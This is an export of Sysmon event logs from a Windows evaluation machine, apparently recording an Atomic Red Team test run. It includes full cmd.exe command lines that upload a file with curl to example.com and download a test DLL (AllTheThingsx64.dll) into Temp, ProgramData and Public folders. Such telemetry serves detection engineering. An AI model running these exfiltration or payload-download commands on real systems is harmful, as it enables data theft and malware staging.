CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d4e-658c-ec01-000000000f00},3588,10268,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:10.5576598Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:10.556,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:10.5576598Z""/>
      <EventRecordID>19616</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:10.556</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d4e-658c-ec01-000000000f00}</Data>
      <Data Name=""ProcessId"">10268</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:10.556

ProcessGuid: {f57bd86a-8d4e-658c-ec01-000000000f00}

ProcessId: 10268

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19615,,,<unknown process>,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:54:16.164

ProcessGuid: {00000000-0000-0000-0000-000000000000}

ProcessId: 10696

QueryName: github.com

QueryStatus: 0

QueryResults: ::ffff:140.82.121.4;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,,{00000000-0000-0000-0000-000000000000},3588,10696,,github.com,::ffff:140.82.121.4;,0,"
      ",-,2023-12-27T20:47:10.4923090Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:54:16.164,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:10.4923090Z""/>
      <EventRecordID>19615</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:54:16.164</Data>
      <Data Name=""ProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ProcessId"">10696</Data>
      <Data Name=""QueryName"">github.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:140.82.121.4;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:54:16.164

ProcessGuid: {00000000-0000-0000-0000-000000000000}

ProcessId: 10696

QueryName: github.com

QueryStatus: 0

QueryResults: ::ffff:140.82.121.4;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:47:10.281,,,11,19614,,,C:\Windows\System32\curl.exe,,0x8000000000000000,Information,,,"File created:

RuleName: DLL

UtcTime: 2023-12-27 20:47:10.281

ProcessGuid: {f57bd86a-8d4e-658c-eb01-000000000f00}

ProcessId: 7416

Image: C:\Windows\System32\curl.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\allthethingsx64.dll

CreationUtcTime: 2023-12-27 20:47:10.281

User: WINDEV2309EVAL\User",Info,,,,,,,,{f57bd86a-8d4e-658c-eb01-000000000f00},3588,7416,,,,,"
      ",DLL,2023-12-27T20:47:10.2956580Z,C:\Users\User\AppData\Local\Temp\allthethingsx64.dll,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:10.281,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:10.2956580Z""/>
      <EventRecordID>19614</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">DLL</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:10.281</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d4e-658c-eb01-000000000f00}</Data>
      <Data Name=""ProcessId"">7416</Data>
      <Data Name=""Image"">C:\Windows\System32\curl.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\allthethingsx64.dll</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:47:10.281</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: DLL

UtcTime: 2023-12-27 20:47:10.281

ProcessGuid: {f57bd86a-8d4e-658c-eb01-000000000f00}

ProcessId: 7416

Image: C:\Windows\System32\curl.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\allthethingsx64.dll

CreationUtcTime: 2023-12-27 20:47:10.281

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\User\AppData\Local\Temp\allthethingsx64.dll,"curl, https://curl.se/",WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,The curl executable,1,19613,8.4.0,"MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2",C:\Windows\System32\curl.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:10.084

ProcessGuid: {f57bd86a-8d4e-658c-eb01-000000000f00}

ProcessId: 7416

Image: C:\Windows\System32\curl.exe

FileVersion: 8.4.0

Description: The curl executable

Product: The curl executable

Company: curl, https://curl.se/

OriginalFileName: curl.exe

CommandLine: C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\User\AppData\Local\Temp\allthethingsx64.dll

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2

ParentProcessGuid: {f57bd86a-8d4c-658c-e601-000000000f00}

ParentProcessId: 10792

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll

ParentUser: WINDEV2309EVAL\User",Info,curl.exe,"""cmd.exe"" /c C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll",C:\Windows\System32\cmd.exe,{f57bd86a-8d4c-658c-e601-000000000f00},10792,WINDEV2309EVAL\User,,{f57bd86a-8d4e-658c-eb01-000000000f00},3588,7416,The curl executable,,,,"
      ",-,2023-12-27T20:47:10.0857664Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:10.084,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:10.0857664Z""/>
      <EventRecordID>19613</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:10.084</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d4e-658c-eb01-000000000f00}</Data>
      <Data Name=""ProcessId"">7416</Data>
      <Data Name=""Image"">C:\Windows\System32\curl.exe</Data>
      <Data Name=""FileVersion"">8.4.0</Data>
      <Data Name=""Description"">The curl executable</Data>
      <Data Name=""Product"">The curl executable</Data>
      <Data Name=""Company"">curl, https://curl.se/</Data>
      <Data Name=""OriginalFileName"">curl.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\User\AppData\Local\Temp\allthethingsx64.dll</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d4c-658c-e601-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10792</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:10.084

ProcessGuid: {f57bd86a-8d4e-658c-eb01-000000000f00}

ProcessId: 7416

Image: C:\Windows\System32\curl.exe

FileVersion: 8.4.0

Description: The curl executable

Product: The curl executable

Company: curl, https://curl.se/

OriginalFileName: curl.exe

CommandLine: C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\User\AppData\Local\Temp\allthethingsx64.dll

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2

ParentProcessGuid: {f57bd86a-8d4c-658c-e601-000000000f00}

ParentProcessId: 10792

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:47:10.074,,,11,19612,,,C:\Windows\System32\curl.exe,,0x8000000000000000,Information,,,"File created:

RuleName: DLL

UtcTime: 2023-12-27 20:47:10.074

ProcessGuid: {f57bd86a-8d4d-658c-ea01-000000000f00}

ProcessId: 7460

Image: C:\Windows\System32\curl.exe

TargetFilename: C:\ProgramData\allthethingsx64.dll

CreationUtcTime: 2023-12-27 20:47:10.074

User: WINDEV2309EVAL\User",Info,,,,,,,,{f57bd86a-8d4d-658c-ea01-000000000f00},3588,7460,,,,,"
      ",DLL,2023-12-27T20:47:10.0807529Z,C:\ProgramData\allthethingsx64.dll,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:10.074,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:10.0807529Z""/>
      <EventRecordID>19612</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">DLL</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:10.074</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d4d-658c-ea01-000000000f00}</Data>
      <Data Name=""ProcessId"">7460</Data>
      <Data Name=""Image"">C:\Windows\System32\curl.exe</Data>
      <Data Name=""TargetFilename"">C:\ProgramData\allthethingsx64.dll</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:47:10.074</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: DLL

UtcTime: 2023-12-27 20:47:10.074

ProcessGuid: {f57bd86a-8d4d-658c-ea01-000000000f00}

ProcessId: 7460

Image: C:\Windows\System32\curl.exe

TargetFilename: C:\ProgramData\allthethingsx64.dll

CreationUtcTime: 2023-12-27 20:47:10.074

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
